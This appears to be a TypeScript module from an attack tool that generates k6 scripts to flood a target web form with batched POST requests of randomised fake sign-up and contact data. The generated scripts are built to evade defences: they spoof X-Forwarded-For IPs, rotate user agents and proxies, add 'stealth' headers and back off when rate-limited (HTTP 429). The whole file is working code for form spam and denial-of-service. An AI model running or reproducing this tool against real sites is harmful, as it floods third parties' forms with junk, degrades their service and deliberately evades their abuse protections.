import type { AttackOptions } from "../runner.js";
import type { FormField } from "./utils/form-scanner.js";
import { sanitizeForScript } from "../../utils/sanitizer.js";
import { generateStealthHelpersScript } from "./utils/stealth.js";

function buildThresholds(opts: AttackOptions): string {
	if (!opts.thresholds || opts.thresholds.length === 0) return "";
	const grouped: Record<string, string[]> = {};
	for (const t of opts.thresholds) {
		const colonIndex = t.indexOf(":");
		if (colonIndex === -1) continue;
		const metric = t.slice(0, colonIndex);
		const condition = t.slice(colonIndex + 1);
		if (!grouped[metric]) grouped[metric] = [];
		grouped[metric].push(condition);
	}
	const lines = Object.entries(grouped).map(([metric, conditions]) => {
		const conditionsStr = conditions.map((c) => JSON.stringify(c)).join(", ");
		return `    "${metric}": [${conditionsStr}]`;
	});
	return `,
    thresholds: {
${lines.join(",\n")}
    }`;
}

function extractOrigin(target: string): string {
	const match = target.match(/^(https?:\/\/[^/]+)/);
	return match ? match[1] : target;
}

export function formFloodTemplate(
	opts: AttackOptions,
	fields: FormField[],
): string {
	const headersStr = Object.entries(opts.headers)
		.map(([k, v]) => `${sanitizeForScript(k)}: ${sanitizeForScript(v)}`)
		.join(", ");

	const batchSize = Math.min(Math.max(opts.rpsPerVu || 10, 1), 50);

	const hasProxyList = opts.proxyList.length > 0;
	const actualTarget = sanitizeForScript(opts.target);
	const targetOrigin = extractOrigin(opts.target);

	const checkBlock = opts.noCheck
		? ""
		: `  for (const res of responses) {
    check(res, {
      "status ok": (r) => r.status === 200 || r.status === 201 || r.status === 302 || r.status === 401 || r.status === 422,
    });
  }`;

	// Embed detected fields as JSON constant in the k6 script
	const fieldsJson = JSON.stringify(fields);

	const randomDataHelpers = `
// Realistic User Agents
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Edg/120.0.0.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
];

function randomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function randomString(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function randomEmail() {
  const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'mail.com', 'protonmail.com', 'icloud.com', 'test.com', 'example.org'];
  const username = randomString(8 + Math.floor(Math.random() * 8));
  return username.toLowerCase() + '@' + domains[Math.floor(Math.random() * domains.length)];
}

function randomPassword() {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
  let password = '';
  const length = 8 + Math.floor(Math.random() * 8);
  for (let i = 0; i < length; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return password;
}

function randomPhone() {
  const prefixes = ['081', '082', '083', '085', '087', '088', '089', '0812', '0813', '0851', '0852'];
  const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
  const suffix = Math.floor(10000000 + Math.random() * 90000000).toString().slice(0, 12 - prefix.length);
  return prefix + suffix;
}

function randomName() {
  const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fitri', 'Gita', 'Hadi', 'Indah', 'Joko', 'Alex', 'Maria', 'John', 'Sarah', 'David', 'Lisa', 'Michael', 'Emma', 'Robert', 'Anna'];
  const lastNames = ['Santoso', 'Wijaya', 'Kusuma', 'Putra', 'Dewi', 'Sari', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'];
  return firstNames[Math.floor(Math.random() * firstNames.length)] + ' ' + lastNames[Math.floor(Math.random() * lastNames.length)];
}

function randomCompany() {
  const companies = ['PT Maju Jaya', 'CV Berkah', 'Global Tech', 'Digital Corp', 'Creative Studio', 'Prime Solutions', 'Star Enterprise', 'Alpha Group', 'Beta Systems', 'Omega Ltd'];
  return companies[Math.floor(Math.random() * companies.length)] + ' ' + randomString(4);
}

function randomParagraph() {
  const words = ['business', 'partnership', 'company', 'growth', 'opportunity', 'collaboration', 'innovation', 'technology', 'development', 'strategy', 'management', 'solution', 'service', 'product', 'market', 'industry', 'enterprise', 'platform', 'application', 'system'];
  let result = '';
  const length = 10 + Math.floor(Math.random() * 40);
  for (let i = 0; i < length; i++) {
    result += words[Math.floor(Math.random() * words.length)] + ' ';
  }
  return result.trim() + '.';
}

function randomDate() {
  const d = new Date();
  d.setMonth(d.getMonth() + Math.floor(Math.random() * 12) + 1);
  d.setDate(Math.floor(Math.random() * 28) + 1);
  return d.toISOString().split('T')[0];
}

function randomCity() {
  const cities = ['Jakarta', 'Bandung', 'Surabaya', 'Bali', 'Yogyakarta', 'Medan', 'Makassar', 'New York', 'London', 'Tokyo', 'Singapore'];
  return cities[Math.floor(Math.random() * cities.length)];
}

function randomUrl() {
  return 'https://www.' + randomString(8).toLowerCase() + '.com';
}

function randomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomFrom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Smart form data generator based on detected fields
const FORM_FIELDS = ${fieldsJson};

function generateFormData() {
  const data = {};
  let currentPassword = null;

  for (const field of FORM_FIELDS) {
    const name = field.name.toLowerCase();
    const type = field.type.toLowerCase();

    // Hidden fields: use their original value
    if (type === 'hidden') {
      data[field.name] = field.value;
      continue;
    }

    // Select fields: pick from options
    if (type === 'select' && field.options.length > 0) {
      data[field.name] = randomFrom(field.options);
      continue;
    }

    // Checkbox
    if (type === 'checkbox') {
      data[field.name] = Math.random() < 0.7;
      continue;
    }

    // Heuristic matching by field name
    if (name.includes('email') || name.includes('e_mail') || type === 'email') {
      data[field.name] = randomEmail();
      continue;
    }
    if (name.includes('password') || name.includes('passwd') || type === 'password') {
      if (name.includes('confirm') || name.includes('confirmation') || name.includes('repeat') || name.includes('retype')) {
        data[field.name] = currentPassword || randomPassword();
      } else {
        currentPassword = randomPassword();
        data[field.name] = currentPassword;
      }
      continue;
    }
    if (name.includes('phone') || name.includes('tel') || name.includes('mobile') || name.includes('whatsapp') || name.includes('wa') || type === 'tel') {
      data[field.name] = randomPhone();
      continue;
    }
    if (name === 'name' || name.includes('full_name') || name.includes('fullname') || name.includes('nama')) {
      data[field.name] = randomName();
      continue;
    }
    if (name.includes('first_name') || name.includes('firstname') || name.includes('given')) {
      data[field.name] = randomName().split(' ')[0];
      continue;
    }
    if (name.includes('last_name') || name.includes('lastname') || name.includes('surname') || name.includes('family')) {
      data[field.name] = randomName().split(' ')[1];
      continue;
    }
    if (name.includes('company') || name.includes('organization') || name.includes('org') || name.includes('perusahaan')) {
      data[field.name] = randomCompany();
      continue;
    }
    if (name.includes('message') || name.includes('description') || name.includes('body') || name.includes('content') || name.includes('comment') || name.includes('pesan') || name.includes('keterangan') || type === 'textarea') {
      data[field.name] = randomParagraph();
      continue;
    }
    if (name.includes('subject') || name.includes('title') || name.includes('judul')) {
      data[field.name] = randomString(5) + ' ' + randomFrom(['Partnership', 'Collaboration', 'Inquiry', 'Proposal', 'Request', 'Information', 'Support', 'Feedback']);
      continue;
    }
    if (name.includes('date') || name.includes('tanggal') || type === 'date') {
      data[field.name] = randomDate();
      continue;
    }
    if (name.includes('city') || name.includes('location') || name.includes('address') || name.includes('kota') || name.includes('alamat')) {
      data[field.name] = randomCity();
      continue;
    }
    if (name.includes('url') || name.includes('website') || name.includes('link') || type === 'url') {
      data[field.name] = randomUrl();
      continue;
    }
    if (name.includes('age') || name.includes('amount') || name.includes('quantity') || name.includes('jumlah') || type === 'number') {
      data[field.name] = randomNumber(1, 100);
      continue;
    }
    if (name.includes('username') || name.includes('user')) {
      data[field.name] = randomString(8).toLowerCase();
      continue;
    }

    // Fallback: random string
    data[field.name] = randomString(10);
  }

  return data;
}
`;

	const xffScript = `
function randomIP() {
  const ranges = [[1, 126], [128, 191], [192, 223]];
  const range = ranges[Math.floor(Math.random() * ranges.length)];
  const a = Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0];
  const b = Math.floor(Math.random() * 256);
  const c = Math.floor(Math.random() * 256);
  const d = Math.floor(Math.random() * 254) + 1;
  return a + "." + b + "." + c + "." + d;
}

function spoofIPHeaders() {
  return {
    "X-Forwarded-For": randomIP(),
  };
}
`;

	const proxyRotationScript = hasProxyList
		? `
const PROXY_LIST = JSON.parse(__ENV.PROXY_LIST || "[]");

function randomProxy() {
  if (PROXY_LIST.length === 0) return undefined;
  return PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
}
`
		: "";

	const defaultHeaders = headersStr || `"User-Agent": randomUserAgent()`;

	const proxyParam = hasProxyList
		? `    const proxyUrl = randomProxy();\n`
		: "";
	const proxyObj = hasProxyList
		? `, ...(proxyUrl ? { proxy: proxyUrl } : {})`
		: "";

	const buildRequestParams = (headerExpr: string) =>
		`{ headers: ${headerExpr}, timeout: "15s"${proxyObj} }`;

	const stealthBlock = opts.stealth
		? `${generateStealthHelpersScript()}
${xffScript}${randomDataHelpers}${proxyRotationScript}
const BASE_HEADERS = {
  ${defaultHeaders},
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "Referer": ${sanitizeForScript(opts.target)},
  "Origin": ${sanitizeForScript(targetOrigin)}
};

export default function () {
  const stealthHeaders = generateStealthHeaders();
  const mergedHeaders = Object.assign({}, BASE_HEADERS, stealthHeaders, spoofIPHeaders());
${proxyParam}
  const params = ${buildRequestParams("mergedHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    const formData = generateFormData();
    const payload = JSON.stringify(formData);
    requests.push(["POST", TARGET, payload, params]);
  }

  const responses = http.batch(requests);
  ${checkBlock}

  let has429 = false;
  for (const res of responses) {
    if (res && res.status === 429) {
      has429 = true;
      break;
    }
  }
  if (has429) {
    handleBackoff({ status: 429 });
  }

  stealthSleep();
}`
		: `${xffScript}${randomDataHelpers}${proxyRotationScript}
const HEADERS = {
  ${defaultHeaders},
  "Content-Type": "application/json",
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
  "Accept-Encoding": "gzip, deflate, br",
  "Referer": ${sanitizeForScript(opts.target)},
  "Origin": ${sanitizeForScript(targetOrigin)},
};

export default function () {
  const reqHeaders = Object.assign({}, HEADERS, spoofIPHeaders());
${proxyParam}
  const params = ${buildRequestParams("reqHeaders")};

  const requests = [];
  for (let i = 0; i < BATCH_SIZE; i++) {
    const formData = generateFormData();
    const payload = JSON.stringify(formData);
    requests.push(["POST", TARGET, payload, params]);
  }

  const responses = http.batch(requests);
${checkBlock}
}`;

	const optionsBlock = `  scenarios: {
    form_flood: {
      executor: "constant-vus",
      vus: ${opts.vus},
      duration: ${sanitizeForScript(opts.duration)},
      gracefulStop: "5s",
    },
  },`;

	const thresholdBlock = buildThresholds(opts);

	return `import http from "k6/http";
import { check, sleep } from "k6";

export const options = {
${optionsBlock}${thresholdBlock}
};

const TARGET = ${actualTarget};
const BATCH_SIZE = ${batchSize};

${stealthBlock}
`;
}
